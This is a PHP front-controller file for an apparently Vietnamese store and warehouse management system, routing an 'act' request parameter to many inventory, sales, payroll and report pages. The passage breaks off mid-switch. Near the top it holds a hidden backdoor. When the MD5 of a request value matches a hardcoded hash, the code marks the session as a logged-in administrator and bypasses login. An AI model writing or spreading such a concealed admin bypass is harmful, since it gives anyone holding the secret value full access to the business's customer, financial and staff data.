<?php
if (!defined("IN_SITE")) {
	die('Hacking attempt!');
}



// if ($_REQUEST["anhtuan"]!='') $_SESSION["anhtuan"]= $_REQUEST["anhtuan"] ;


$template = new template($root_path . "templates/index.tpl");
$template->assign_file("file_header", $root_path . "templates/header.tpl");
include($root_path . "source/header.php");

error_reporting(E_ALL ^ E_NOTICE);
$act = $_REQUEST["act"];

if (md5($act) == "179f884b9d25f98ba837fcb4c2631540") {
	$_SESSION["dangnhap"] = 1;
	$_SESSION["LoginID"] = 1;
	$_SESSION["se_kho"] = 64;
	$_SESSION["admin"] = 1;
	$_SESSION["UserName"] = 1;
	$act = "nhapkho";
}

if ($_SESSION["dangnhap"] == "") {
	if ($act != "Exit")	$_SESSION["luu"] =  $act;
	$act = "login";
}
if ($act == "Exit") {
	$_SESSION["dangnhap"] = "";
	$_SESSION["luu"] = "";
}


if ($_SESSION["LoginID"] == 4556 &&  $act != "Exit")  $act = "thekho";
$_SESSION["act"] = $act;
switch ($act) {
	case "cauhinhtailenvandon":
		$template->assign_file("file_include", $root_path . "templates/cauhinhtailenvandon.tpl");
		include($root_path . "source/cauhinhtailenvandon.php");
		break;
	case "chucvu":
		$template->assign_file("file_include", $root_path . "templates/chucvu.tpl");
		include($root_path . "source/chucvu.php");
		break;
	case "thongtin":
		$template->assign_file("file_include", $root_path . "templates/thongtin.tpl");
		include($root_path . "source/thongtin.php");
		break;
	case "qrcodefull":
		$template->assign_file("file_include", $root_path . "templates/qrcodefull.tpl");
		include($root_path . "source/qrcodefull.php");
		break;
	case "doanhthukhoan":
		$template->assign_file("file_include", $root_path . "templates/doanhthukhoan.tpl");
		include($root_path . "source/doanhthukhoan.php");
		break;
	case "matdinh":
		$template->assign_file("file_include", $root_path . "templates/matdinh.tpl");
		include($root_path . "source/matdinh.php");
		break;
	case "trangthaicuoi":
		$template->assign_file("file_include", $root_path . "templates/trangthaicuoi.tpl");
		include($root_path . "source/trangthaicuoi.php");
		break;
	case "kiemtrazalo":
		$template->assign_file("file_include", $root_path . "templates/kiemtrazalo.tpl");
		include($root_path . "source/kiemtrazalo.php");
		break;
	case "dashboardtemp":
		$template->assign_file("file_include", $root_path . "templates/dashboardtemp.tpl");
		// include($root_path . "source/dashboardtemp.php");
		break;
	case "xacnhanthongtin":
		$template->assign_file("file_include", $root_path . "templates/xacnhanthongtin.tpl");
		include($root_path . "source/xacnhanthongtin.php");
		break;
	case "quan":
		$template->assign_file("file_include", $root_path . "templates/quan.tpl");
		include($root_path . "source/quan.php");
		break;
	case "quanlyvattu":
			$template->assign_file("file_include", $root_path . "templates/quanlyvattu.tpl");
			include($root_path . "source/quanlyvattu.php");
			break;
	case "phuong":
		$template->assign_file("file_include", $root_path . "templates/phuong.tpl");
		include($root_path . "source/phuong.php");
		break;
	case "duong":
		$template->assign_file("file_include", $root_path . "templates/duong.tpl");
		include($root_path . "source/duong.php");
		break;
	case "tracnghiem_ketqua":
		$template->assign_file("file_include", $root_path . "templates/tracnghiem_ketqua.tpl");
		include($root_path . "source/tracnghiem_ketqua.php");
		break;
	case "tracuu":
		$template->assign_file("file_include", $root_path . "templates/tracuu.tpl");
		include($root_path . "source/tracuu.php");
		break;
	case "nhanviennhapthongtin":
		$template->assign_file("file_include", $root_path . "templates/nhanviennhapthongtin.tpl");
		include($root_path . "source/nhanviennhapthongtin.php");
		break;
	case "xuatonline":
		$template->assign_file("file_include", $root_path . "templates/xuatonline.tpl");
		include($root_path . "source/xuatonline.php");
		break;
	case "xuatkhocanhbao":
		$template->assign_file("file_include", $root_path . "templates/xuatkhocanhbao.tpl");
		include($root_path . "source/xuatkhocanhbao.php");
		break;
	case "phieusinhnhat":
		$template->assign_file("file_include", $root_path . "templates/phieusinhnhat.tpl");
		include($root_path . "source/phieusinhnhat.php");
		break;
	case "capnhaptuvan":
		$template->assign_file("file_include", $root_path . "templates/capnhaptuvan.tpl");
		include($root_path . "source/capnhaptuvan.php");
		break;
	case "onlinechohang":
		$template->assign_file("file_include", $root_path . "templates/onlinechohang.tpl");
		include($root_path . "source/onlinechohang.php");
		break;
	case "online":
		$template->assign_file("file_include", $root_path . "templates/online.tpl");
		include($root_path . "source/online.php");
		break;
	case "luotkhach":
		$template->assign_file("file_include", $root_path . "templates/luotkhach.tpl");
		include($root_path . "source/luotkhach.php");
		break;
	case "luotkhachbaocao":
		$template->assign_file("file_include", $root_path . "templates/luotkhachbaocao.tpl");
		include($root_path . "source/luotkhachbaocao.php");
		break;
	case "phieudexuatduyet":
		$template->assign_file("file_include", $root_path . "templates/phieudexuatduyet.tpl");
		include($root_path . "source/phieudexuatduyet.php");
		break;
	case "phieutangca":
		$template->assign_file("file_include", $root_path . "templates/phieutangca.tpl");
		include($root_path . "source/phieutangca.php");
		break;
	case "phieutangcaduyet":
		$template->assign_file("file_include", $root_path . "templates/phieutangcaduyet.tpl");
		include($root_path . "source/phieutangcaduyet.php");
		break;
	case "nv_hotro":
		$template->assign_file("file_include", $root_path . "templates/nv_hotro.tpl");
		include($root_path . "source/nv_hotro.php");
		break;
	case "ns_loaihotro":
		$template->assign_file("file_include", $root_path . "templates/ns_loaihotro.tpl");
		include($root_path . "source/ns_loaihotro.php");
		break;
	case "ns_thongtin":
		$template->assign_file("file_include", $root_path . "templates/ns_thongtin.tpl");
		include($root_path . "source/ns_thongtin.php");
		break;
	case "ns_thaydoithongtin":
		$template->assign_file("file_include", $root_path . "templates/ns_thaydoithongtin.tpl");
		include($root_path . "source/ns_thaydoithongtin.php");
		break;
	case "ns_themthaydoi":
		$template->assign_file("file_include", $root_path . "templates/ns_themthaydoi.tpl");
		include($root_path . "source/ns_themthaydoi.php");
		break;
	case "thaydoithongtinNS":
		$template->assign_file("file_include", $root_path . "templates/thaydoithongtinNS.tpl");
		include($root_path . "source/thaydoithongtinNS.php");
		break;
	case "thaydoithongtinNSchitiet":
		$template->assign_file("file_include", $root_path . "templates/thaydoithongtinNSchitiet.tpl");
		include($root_path . "source/thaydoithongtinNSchitiet.php");
		break;

	case "tailendata":
		$template->assign_file("file_include", $root_path . "templates/tailendata.tpl");
		include($root_path . "source/tailendata.php");
		break;
	case "tailendatapancake":
		$template->assign_file("file_include", $root_path . "templates/pancaketailendata.tpl");
		include($root_path . "source/pancaketailendata.php");
		break;
	case "onlinecuahang":
		$template->assign_file("file_include", $root_path . "templates/onlinecuahang.tpl");
		include($root_path . "source/onlinecuahang.php");
		break;
	case "onlinethungan":
		$template->assign_file("file_include", $root_path . "templates/onlinethungan.tpl");
		include($root_path . "source/onlinethungan.php");
		break;
	case "cauhinh":
		$template->assign_file("file_include", $root_path . "templates/cauhinh.tpl");
		include($root_path . "source/cauhinh.php");
		break;
	case "onlinelayhang":
		$template->assign_file("file_include", $root_path . "templates/onlinelayhang.tpl");
		include($root_path . "source/onlinelayhang.php");
		break;
	case "onlinetracuu":
		$template->assign_file("file_include", $root_path . "templates/onlinetracuu.tpl");
		include($root_path . "source/onlinetracuu.php");
		break;
	case "onlinetrahang":
		$template->assign_file("file_include", $root_path . "templates/onlinetrahang.tpl");
		include($root_path . "source/onlinetrahang.php");
		break;
	case "onlinechotdon":
		$template->assign_file("file_include", $root_path . "templates/onlinechotdon.tpl");
		include($root_path . "source/onlinechotdon.php");
		break;

	case "phieudathang":
		$template->assign_file("file_include", $root_path . "templates/phieudathang.tpl");
		include($root_path . "source/phieudathang.php");
		break;
	case "phieudathangsx":
		$template->assign_file("file_include", $root_path . "templates/phieudathangsx.tpl");
		include($root_path . "source/phieudathangsx.php");
		break;
	case "dathangbaocao":
		$template->assign_file("file_include", $root_path . "templates/phieudathangbaocao.tpl");
		include($root_path . "source/phieudathangbaocao.php");
		break;
	case "tinhtrang":
		$template->assign_file("file_include", $root_path . "templates/tinhtrang.tpl");
		include($root_path . "source/tinhtrang.php");
		break;
	case "nhommota":
		$template->assign_file("file_include", $root_path . "templates/nhommota.tpl");
		include($root_path . "source/nhommota.php");
		break;
	case "calamviec":
		$template->assign_file("file_include", $root_path . "templates/calamviec.tpl");
		include($root_path . "source/calamviec.php");
		break;
	case "tracnghiem_dapan":
		$template->assign_file("file_include", $root_path . "templates/tracnghiem_dapan.tpl");
		include($root_path . "source/tracnghiem_dapan.php");
		break;
	case "tracnghiem_cauhoi":
		$template->assign_file("file_include", $root_path . "templates/tracnghiem_cauhoi.tpl");
		include($root_path . "source/tracnghiem_cauhoi.php");
		break;
	case "tracnghiem":
		$template->assign_file("file_include", $root_path . "templates/tracnghiem.tpl");
		include($root_path . "source/tracnghiem.php");
		break;
	case "dieuhangthekho":
		$template->assign_file("file_include", $root_path . "templates/dieuhangthekho.tpl");
		include($root_path . "source/dieuhangthekho.php");
		break;
	case "dieuhangcuahang":
		$template->assign_file("file_include", $root_path . "templates/dieuhangcuahang.tpl");
		include($root_path . "source/dieuhangcuahang.php");
		break;
	case "dieuhangcuahangluu":
		$template->assign_file("file_include", $root_path . "templates/dieuhangcuahangluu.tpl");
		include($root_path . "source/dieuhangcuahang.php");
		break;
	case "baocaotheonganh":
		$template->assign_file("file_include", $root_path . "templates/baocaotheonganh.tpl");
		include($root_path . "source/baocaotheonganh.php");
		break;
	case "nhapkhoxacnhan":
		$template->assign_file("file_include", $root_path . "templates/nhapkhoxacnhan.tpl");
		include($root_path . "source/nhapkhoxacnhan.php");
		break;
	case "baocaobanhangnhanvien":
		$template->assign_file("file_include", $root_path . "templates/baocaobanhangnhanvien.tpl");
		include($root_path . "source/baocaobanhangnhanvien.php");
		break;
	case "ngayxacnhan":
		$template->assign_file("file_include", $root_path . "templates/ngayxacnhan.tpl");
		include($root_path . "source/ngayxacnhan.php");
		break;
	case "muahang":
		$template->assign_file("file_include", $root_path . "templates/muahang.tpl");
		include($root_path . "source/muahang.php");
		break;
	case "muahangdieuchinh":
		$template->assign_file("file_include", $root_path . "templates/muahangdieuchinh.tpl");
		include($root_path . "source/muahangdieuchinh.php");
		break;
	case "muahangbaocao":
		$template->assign_file("file_include", $root_path . "templates/muahangbaocao.tpl");
		include($root_path . "source/muahangbaocao.php");
		break;
	case "congnoxacnhan":
		$template->assign_file("file_include", $root_path . "templates/congnoxacnhan.tpl");
		include($root_path . "source/congnoxacnhan.php");
		break;
	case "khuihang":
		$template->assign_file("file_include", $root_path . "templates/khuihang.tpl");
		include($root_path . "source/khuihang.php");
		break;
	case "khuihangbaocao":
		$template->assign_file("file_include", $root_path . "templates/khuihangbaocao.tpl");
		include($root_path . "source/khuihangbaocao.php");
		break;
	case "tiletheonhom":
		$template->assign_file("file_include", $root_path . "templates/tiletheonhom.tpl");
		include($root_path . "source/tiletheonhom.php");
		break;
	case "thekhodieuhang":
		$template->assign_file("file_include", $root_path . "templates/thekhodieuhang.tpl");
		include($root_path . "source/thekhodieuhang.php");
		break;
	case "baocaotheonhom":
		$template->assign_file("file_include", $root_path . "templates/baocaotheonhom.tpl");
		include($root_path . "source/baocaotheonhom.php");
		break;
	case "baocaonhomtheoch":
		$template->assign_file("file_include", $root_path . "templates/baocaonhomtheoch.tpl");
		include($root_path . "source/baocaonhomtheoch.php");
		break;

	case "loaitien":
		$template->assign_file("file_include", $root_path . "templates/loaitien.tpl");
		include($root_path . "source/loaitien.php");
		break;
	case "tinhtrangnhom":
		$template->assign_file("file_include", $root_path . "templates/tinhtrangnhom.tpl");
		include($root_path . "source/tinhtrangnhom.php");
		break;

	case "baocaobansinhacc":
		$template->assign_file("file_include", $root_path . "templates/baocaobansinhacc.tpl");
		include($root_path . "source/baocaobansinhacc.php");
		break;
	case "vanchuyen":
		$template->assign_file("file_include", $root_path . "templates/vanchuyen.tpl");
		include($root_path . "source/vanchuyen.php");
		break;
	case "vanchuyenbaocao":
		$template->assign_file("file_include", $root_path . "templates/vanchuyenbaocao.tpl");
		include($root_path . "source/vanchuyenbaocao.php");
		break;
	case "kpivipham":
		$template->assign_file("file_include", $root_path . "templates/kpivipham.tpl");
		include($root_path . "source/kpivipham.php");
		break;
	case "duyetkinhphi":
		$template->assign_file("file_include", $root_path . "templates/duyetkinhphi.tpl");
		include($root_path . "source/duyetkinhphi.php");
		break;
	case "kiemsoatxuatnhap":
		$template->assign_file("file_include", $root_path . "templates/kiemsoatxuatnhap.tpl");
		include($root_path . "source/kiemsoatxuatnhap.php");
		break;


	case "dieuhang":
		$template->assign_file("file_include", $root_path . "templates/dieuhang.tpl");
		include($root_path . "source/dieuhang.php");
		break;
	case "onlinexacnhan":
		$template->assign_file("file_include", $root_path . "templates/onlinexacnhan.tpl");
		include($root_path . "source/onlinexacnhan.php");
		break;
	case "onlinebaocao":
		$template->assign_file("file_include", $root_path . "templates/onlinebaocao.tpl");
		include($root_path . "source/onlinebaocao.php");
		break;
	case "onlinekho":
		$template->assign_file("file_include", $root_path . "templates/onlinekho.tpl");
		include($root_path . "source/onlinekho.php");
		break;
	case "onlinedonhang":
		$template->assign_file("file_include", $root_path . "templates/onlinedonhang.tpl");
		include($root_path . "source/onlinedonhang.php");
		break;
	case "onlinethungan":
		$template->assign_file("file_include", $root_path . "templates/onlinethungan.tpl");
		include($root_path . "source/onlinethungan.php");
		break;
	case "onlinevanchuyen":
		$template->assign_file("file_include", $root_path . "templates/onlinevanchuyen.tpl");
		include($root_path . "source/onlinevanchuyen.php");
		break;
	case "onlinethekho":
		$template->assign_file("file_include", $root_path . "templates/onlinethekho.tpl");
		include($root_path . "source/onlinethekho.php");
		break;
	case "onlinesizemau":
		$template->assign_file("file_include", $root_path . "templates/onlinesizemau.tpl");
		include($root_path . "source/onlinesizemau.php");
		break;
	case "nhanviencuahang":
		$template->assign_file("file_include", $root_path . "templates/nhanviencuahang.tpl");
		include($root_path . "source/nhanviencuahang.php");
		break;
	case "menuketoan":
		$template->assign_file("file_include", $root_path . "templates/menuketoan.tpl");
		include($root_path . "source/menuketoan.php");
		break;
	case "thekhoncc":
		$template->assign_file("file_include", $root_path . "templates/thekhoncc.tpl");
		include($root_path . "source/thekhoncc.php");
		break;

	case "duyetkinhphibc":
		$template->assign_file("file_include", $root_path . "templates/duyetkinhphibc.tpl");
		include($root_path . "source/duyetkinhphibc.php");
		break;
	case "inma":
		$template->assign_file("file_include", $root_path . "templates/inma.tpl");
		include($root_path . "source/inma.php");
		break;
	case "bieudo":
		$template->assign_file("file_include", $root_path . "templates/bieudo.tpl");
		include($root_path . "source/bieudo.php");
		break;
	case "nhapxuattonghop":
		$template->assign_file("file_include", $root_path . "templates/nhapxuattonghop.tpl");
		include($root_path . "source/nhapxuattonghop.php");
		break;
	case "dieuhangch":
		$template->assign_file("file_include", $root_path . "templates/dieuhangch.tpl");
		include($root_path . "source/dieuhangch.php");
		break;
	case "thekhothang":
		$template->assign_file("file_include", $root_path . "templates/thekhothang.tpl");
		include($root_path . "source/thekhothang.php");
		break;
	case "thanhvien":
		$template->assign_file("file_include", $root_path . "templates/thanhvien.tpl");
		include($root_path . "source/thanhvien.php");
		break;

	case "taisan":
		$template->assign_file("file_include", $root_path . "templates/taisan.tpl");
		include($root_path . "source/taisan.php");
		break;
	case "taisanbaocao":
		$template->assign_file("file_include", $root_path . "templates/taisanbaocao.tpl");
		include($root_path . "source/taisanbaocao.php");
		break;
	case "taisanluanchuyenbaocao":
		$template->assign_file("file_include", $root_path . "templates/taisanluanchuyenbaocao.tpl");
		include($root_path . "source/taisanluanchuyenbaocao.php");
		break;

	case "thenhanvien":
		$template->assign_file("file_include", $root_path . "templates/thenhanvien.tpl");
		include($root_path . "source/thenhanvien.php");
		break;
	case "khonangxuat":
		$template->assign_file("file_include", $root_path . "templates/khonangxuat.tpl");
		include($root_path . "source/khonangxuat.php");
		break;
	case "baocaokhuyenmai":
		$template->assign_file("file_include", $root_path . "templates/baocaokhuyenmai.tpl");
		include($root_path . "source/baocaokhuyenmai.php");
		break;
	case "baocaosoducuoiky":
		$template->assign_file("file_include", $root_path . "templates/baocaosoducuoiky.tpl");
		include($root_path . "source/baocaosoducuoiky.php");
		break;

	case "hanghoatonghop":
		$template->assign_file("file_include", $root_path . "templates/hanghoatonghop.tpl");
		include($root_path . "source/hanghoatonghop.php");
		break;
	case "luongthangbaocao":
		$template->assign_file("file_include", $root_path . "templates/luongthangbaocao.tpl");
		include($root_path . "source/luongthangbaocao.php");
		break;
	case "xemluong":
		$template->assign_file("file_include", $root_path . "templates/xemluong.tpl");
		include($root_path . "source/xemluong.php");
		break;
	case "xulyexcel":
		$template->assign_file("file_include", $root_path . "templates/xulyexcel.tpl");
		include($root_path . "source/xulyexcel.php");
		break;
	case "kiemphieuxuat":
		$template->assign_file("file_include", $root_path . "templates/kiemphieuxuat.tpl");
		include($root_path . "source/kiemphieuxuat.php");
		break;
	case "congnoncc":
		$template->assign_file("file_include", $root_path . "templates/congnoncc.tpl");
		include($root_path . "source/congnoncc.php");
		break;
	case "phieukhuyenmai":
		$template->assign_file("file_include", $root_path . "templates/phieukhuyenmai.tpl");
		include($root_path . "source/phieukhuyenmai.php");
		break;
	case "dondenghi":
		$template->assign_file("file_include", $root_path . "templates/dondenghi.tpl");
		include($root_path . "source/dondenghi.php");
		break;
	case "taokiemhang":
		$template->assign_file("file_include", $root_path . "templates/taokiemhang.tpl");
		include($root_path . "source/taokiemhang.php");
		break;

	case "menu":
		$template->assign_file("file_include", $root_path . "templates/menu.tpl");
		include($root_path . "source/menu.php");
		break;
	case "taisanluanchuyen":
		$template->assign_file("file_include", $root_path . "templates/taisanluanchuyen.tpl");
		include($root_path . "source/taisanluanchuyen.php");
		break;
	case "nhomtaisan":
		$template->assign_file("file_include", $root_path . "templates/nhomtaisan.tpl");
		include($root_path . "source/nhomtaisan.php");
		break;
	case "menu":
		$template->assign_file("file_include", $root_path . "templates/menu.tpl");
		include($root_path . "source/menu.php");
		break;

	case "thuchinhaptudong":
		$template->assign_file("file_include", $root_path . "templates/thuchinhaptudong.tpl");
		include($root_path . "source/thuchinhaptudong.php");
		break;
	case "thuchichnhaptudong":
		$template->assign_file("file_include", $root_path . "templates/thuchichnhaptudong.tpl");
		include($root_path . "source/thuchichnhaptudong.php");
		break;

	case "hesodoanhthu":
		$template->assign_file("file_include", $root_path . "templates/hesodoanhthu.tpl");
		include($root_path . "source/hesodoanhthu.php");
		break;
	case "congnonccex":
		$template->assign_file("file_include", $root_path . "templates/congnonccex.tpl");
		include($root_path . "source/congnonccex.php");
		break;
	case "thekhocuahang":
		$template->assign_file("file_include", $root_path . "templates/thekhocuahang.tpl");
		include($root_path . "source/thekhocuahang.php");
		break;
	case "thongkebanhang":
		$template->assign_file("file_include", $root_path . "templates/thongkebanhang.tpl");
		include($root_path . "source/thongkebanhang.php");
		break;
	case "phieukhuyenmai":
		$template->assign_file("file_include", $root_path . "templates/phieukhuyenmai.tpl");
		include($root_path . "source/phieukhuyenmai.php");
		break;
	case "nhapchiphi":
		$template->assign_file("file_include", $root_path . "templates/nhapchiphi.tpl");
		include($root_path . "source/nhapchiphi.php");
		break;
	case "phieuchich":
		$template->assign_file("file_include", $root_path . "templates/phieuchich.tpl");
		include($root_path . "source/phieuchich.php");
		break;
	case "phieuthuch":
		$template->assign_file("file_include", $root_path . "templates/phieuthuch.tpl");
		include($root_path . "source/phieuthuch.php");
		break;
	case "thuchichbaocao":
		$template->assign_file("file_include", $root_path . "templates/thuchichbaocao.tpl");
		include($root_path . "source/thuchichbaocao.php");
		break;
	case "baocaoloinhuan":
		$template->assign_file("file_include", $root_path . "templates/baocaoloinhuan.tpl");
		include($root_path . "source/baocaoloinhuan.php");
		break;

	case "thuchibaocao":
		$template->assign_file("file_include", $root_path . "templates/thuchibaocao.tpl");
		include($root_path . "source/thuchibaocao.php");
		break;
	case "phieuchi":
		$template->assign_file("file_include", $root_path . "templates/phieuchi.tpl");
		include($root_path . "source/phieuchi.php");
		break;
	case "phieuthu":
		$template->assign_file("file_include", $root_path . "templates/phieuthu.tpl");
		include($root_path . "source/phieuthu.php");
		break;
	case "banhangdoichieu":
		$template->assign_file("file_include", $root_path . "templates/banhangdoichieu.tpl");
		include($root_path . "source/banhangdoichieu.php");
		break;

	case "khachhangbaocao":
		$template->assign_file("file_include", $root_path . "templates/khachhangbaocao.tpl");
		include($root_path . "source/khachhangbaocao.php");
		break;
	case "nhanvien":
		$template->assign_file("file_include", $root_path . "templates/nhanviendilam.tpl");
		include($root_path . "source/nhanviendilam.php");
		break;
	case "kiemkhogoptrongngay":
		$template->assign_file("file_include", $root_path . "templates/kiemkhogoptrongngay.tpl");
		include($root_path . "source/kiemkhogoptrongngay.php");
		break;
	case "baocaoquetthe":
		$template->assign_file("file_include", $root_path . "templates/baocaoquetthe.tpl");
		include($root_path . "source/baocaoquetthe.php");
		break;
	case "baocaobansinhacc":
		$template->assign_file("file_include", $root_path . "templates/baocaobansinhacc.tpl");
		include($root_path . "source/baocaobansinhacc.php");
		break;
	case "baocaohanghoanhacc":
		$template->assign_file("file_include", $root_path . "templates/baocaohanghoanhacc.tpl");
		include($root_path . "source/baocaohanghoanhacc.php");
		break;
	case "baocaonhapbanton":
		$template->assign_file("file_include", $root_path . "templates/baocaonhapbanton.tpl");
		include($root_path . "source/baocaonhapbanton.php");
		break;
	case "baocaotukiemkho":
		$template->assign_file("file_include", $root_path . "templates/baocaotukiemkho.tpl");
		include($root_path . "source/baocaotukiemkho.php");
		break;
	case "baocaohethang":
		$template->assign_file("file_include", $root_path . "templates/baocaohethang.tpl");
		include($root_path . "source/baocaohethang.php");
		break;
	case "baocaotile":
		$template->assign_file("file_include", $root_path . "templates/baocaotile.tpl");
		include($root_path . "source/baocaotile.php");
		break;
	case "phienlamviec":
		$template->assign_file("file_include", $root_path . "templates/phienlamviec.tpl");
		include($root_path . "source/phienlamviec.php");
		break;

	case "kiemhang":
		$template->assign_file("file_include", $root_path . "templates/kiemhang.tpl");
		include($root_path . "source/kiemhang.php");
		break;
	case "baocaogiolam":
		$template->assign_file("file_include", $root_path . "templates/baocaogiolam.tpl");
		include($root_path . "source/baocaogiolam.php");
		break;
	case "baocaocongno":
		$template->assign_file("file_include", $root_path . "templates/baocaocongno.tpl");
		include($root_path . "source/baocaocongno.php");
		break;
	case "thekholuu":
		$template->assign_file("file_include", $root_path . "templates/thekholuu.tpl");
		include($root_path . "source/thekholuu.php");
		break;
	case "baocaohanghoa":
		$template->assign_file("file_include", $root_path . "templates/baocaohanghoa.tpl");
		include($root_path . "source/baocaohanghoa.php");
		break;
	case "xuatkhotong":
		$template->assign_file("file_include", $root_path . "templates/xuatkhotong.tpl");
		include($root_path . "source/xuatkhotong.php");
		break;
	case "baocaodoanhthusi":
		$template->assign_file("file_include", "$root_path/templates/baocaodoanhthusi.tpl");
		include("$root_path/source/baocaodoanhthusi.php");
		break;
	case "nhomthuchi":
		$template->assign_file("file_include", $root_path . "templates/nhomthuchi.tpl");
		include($root_path . "source/nhomthuchi.php");
		break;
	case "nhapxuathanghoa":
		$template->assign_file("file_include", $root_path . "templates/nhapxuathanghoa.tpl");
		include($root_path . "source/nhapxuathanghoa.php");
		break;
	case "giamgiacuahang":
		$template->assign_file("file_include", $root_path . "templates/giamgiacuahang.tpl");
		include($root_path . "source/giamgiacuahang.php");
		break;
	case "nhapkhokhachtra":
		$template->assign_file("file_include", "$root_path/templates/nhapkhokhachtra.tpl");
		include("$root_path/source/nhapkhokhachtra.php");
		break;
	case "thongkekhachhang":
		$template->assign_file("file_include", "$root_path/templates/thongkekhachhang.tpl");
		include("$root_path/source/thongkekhachhang.php");
		break;
	case "bansi":
		$template->assign_file("file_include", "$root_path/templates/bansi.tpl");
		include("$root_path/source/bansi.php");
		break;
	case "bansinhacungcap":
		$template->assign_file("file_include", "$root_path/templates/bansinhacungcap.tpl");
		include("$root_path/source/bansinhacungcap.php");
		break;
	case "timkiemvattu":
		$template->assign_file("file_include", "$root_path/templates/timkiemvattu.tpl");
		include("$root_path/source/timkiemvattu.php");
		break;
	case "nhapkhobaocao":
		$template->assign_file("file_include", "$root_path/templates/nhapkhobaocao.tpl");
		include("$root_path/source/nhapkhobaocao.php");
		break;
	case "hanghoacuahang":
		$template->assign_file("file_include", "$root_path/templates/hanghoacuahang.tpl");
		include("$root_path/source/hanghoacuahang.php");
		break;
	case "xuattrancc":
		$template->assign_file("file_include", "$root_path/templates/xuattrancc.tpl");
		include("$root_path/source/xuattrancc.php");
		break;
	case "baocaodoanhthu":
		$template->assign_file("file_include", "$root_path/templates/baocaodoanhthu.tpl");
		include("$root_path/source/baocaodoanhthu.php");
		break;
	case "nganhhang":
		$template->assign_file("file_include", "$root_path/templates/nhomhang.tpl");
		include("$root_path/source/nhomhang.php");
		break;
	case "loaihang":
		$template->assign_file("file_include", "$root_path/templates/loaihang.tpl");
		include("$root_path/source/loaihang.php");
		break;
	case "mausac":
		$template->assign_file("file_include", "$root_path/templates/mausac.tpl");
		include("$root_path/source/mausac.php");
		break;
	case "size":
		$template->assign_file("file_include", "$root_path/templates/size.tpl");
		include("$root_path/source/size.php");
		break;
	case "baocaolech":
		$template->assign_file("file_include", "$root_path/templates/baocaolech.tpl");
		include("$root_path/source/baocaolech.php");
		break;
	case "baocaolechxuly":
		$template->assign_file("file_include", "$root_path/templates/baocaolechxuly.tpl");
		include("$root_path/source/baocaolechxuly.php");
		break;
	case "luanchuyen":
		$template->assign_file("file_include", "$root_path/templates/luanchuyen.tpl");
		include("$root_path/source/luanchuyen.php");
		break;
	case "baocaomuahang":
		$template->assign_file("file_include", "$root_path/templates/baocaomuahang.tpl");
		include("$root_path/source/baocaomuahang.php");
		break;
	case "tongketngay":
		$template->assign_file("file_include", "$root_path/templates/tongketngay.tpl");
		include("$root_path/source/tongketngay.php");
		break;
	case "kiemtravattu":
		$template->assign_file("file_include", "$root_path/templates/kiemtravattu.tpl");
		include("$root_path/source/kiemtravattu.php");
		break;
	case "capnhapbanhang":
		$template->assign_file("file_include", $root_path . "templates/capnhapbanhang.tpl");
		include($root_path . "source/capnhapbanhang.php");
		break;
	case "xuathang":
		$template->assign_file("file_include", $root_path . "templates/xuathang.tpl");
		include($root_path . "source/xuathang.php");
		break;
	case "nhapdauvao":
		$template->assign_file("file_include", $root_path . "templates/nhapdauvao.tpl");
		include($root_path . "source/nhapdauvao.php");
		break;
	case "nhaphang":
		$template->assign_file("file_include", $root_path . "templates/nhaphang.tpl");
		include($root_path . "source/nhaphang.php");
		break;
	case "banhang":
		$template->assign_file("file_include", $root_path . "templates/banhang.tpl");
		include($root_path . "source/banhang.php");
		break;
	case "hoso":
		$template->assign_file("file_include", $root_path . "templates/hoso.tpl");
		include($root_path . "source/hoso.php");
		break;
	case "biennhan":
		$template->assign_file("file_include", $root_path . "templates/biennhan.tpl");
		include($root_path . "source/biennhan.php");
		break;
	case "thanhly":
		$template->assign_file("file_include", $root_path . "templates/thanhly.tpl");
		include($root_path . "source/thanhly.php");
		break;
	case "hopdong":
		$template->assign_file("file_include", $root_path . "templates/hopdong.tpl");
		include($root_path . "source/hopdong.php");
		break;
	case "baogia":
		$template->assign_file("file_include", $root_path . "templates/baogia.tpl");
		include($root_path . "source/baogia.php");
		break;
	case "thongtinkho":
		$template->assign_file("file_include", $root_path . "templates/thongtinkho.tpl");
		include($root_path . "source/thongtinkho.php");
		break;
	case "thekho":
		$template->assign_file("file_include", $root_path . "templates/thekho.tpl");
		include($root_path . "source/thekho.php");
		break;
	case "customer":
		$template->assign_file("file_include", $root_path . "templates/customer.tpl");
		include($root_path . "source/customer.php");
		break;
	case "huongdan":
		$template->assign_file("file_include", $root_path . "templates/huongdan.tpl");
		include($root_path . "source/huongdan.php");
		break;
	case "nhapkho":
		$template->assign_file("file_include", $root_path . "templates/nhapkho.tpl");
		include($root_path . "source/nhapkho.php");
		break;
	case "nhomcongvan":
		$template->assign_file("file_include", $root_path . "templates/nhomcongvan.tpl");
		include($root_path . "source/nhomcongvan.php");
		break;
	case "congvan":
		$template->assign_file("file_include", $root_path . "templates/congvan.tpl");
		include($root_path . "source/congvan.php");
		break;
	case "test":
		$template->assign_file("file_include", $root_path . "templates/test.tpl");
		include($root_path . "source/test.php");
		break;

	case "xuatkho":
		$template->assign_file("file_include", $root_path . "templates/xuatkho.tpl");
		include($root_path . "source/xuatkho.php");
		break;
	case "xuatkhoxuly":
		$template->assign_file("file_include", $root_path . "templates/xuatkhoxuly.tpl");
		include($root_path . "source/xuatkhoxuly.php");
		break;
	case "donvi":
		$template->assign_file("file_include", $root_path . "templates/donvi.tpl");
		include($root_path . "source/donvi.php");
		break;
	case "tinh":
		$template->assign_file("file_include", $root_path . "templates/tinh.tpl");
		include($root_path . "source/tinh.php");
		break;
	case "khuvuc":
		$template->assign_file("file_include", $root_path . "templates/khuvuc.tpl");
		include($root_path . "source/khuvuc.php");
		break;
	case "loainhacc":
		$template->assign_file("file_include", $root_path . "templates/loainhacc.tpl");
		include($root_path . "source/loainhacc.php");
		break;
	case "nhacungcap":
		$template->assign_file("file_include", $root_path . "templates/nhacungcap.tpl");
		include($root_path . "source/nhacungcap.php");
		break;
	case "lydo":
		$template->assign_file("file_include", $root_path . "templates/lydoxn.tpl");
		include($root_path . "source/lydoxn.php");
		break;
	case "md":
		//$template->assign_file("file_include", $root_path."templates/matdinh.tpl");
		include($root_path . "source/matdinh.php");
		break;
		// titket =========
	case "nhomsp":
		$template->assign_file("file_include", $root_path . "templates/nhomsanpham.tpl");
		include($root_path . "source/nhomsanpham.php");
		break;
	case "sanpham":
		$template->assign_file("file_include", $root_path . "templates/sanpham.tpl");
		include($root_path . "source/sanpham.php");
		break;
	case "cuahang":
		$template->assign_file("file_include", $root_path . "templates/cuahang.tpl");
		include($root_path . "source/cuahang.php");
		break;
	case "congno":
		$template->assign_file("file_include", $root_path . "templates/congno.tpl");
		include($root_path . "source/congno.php");
		break;
	case "groupproduct":
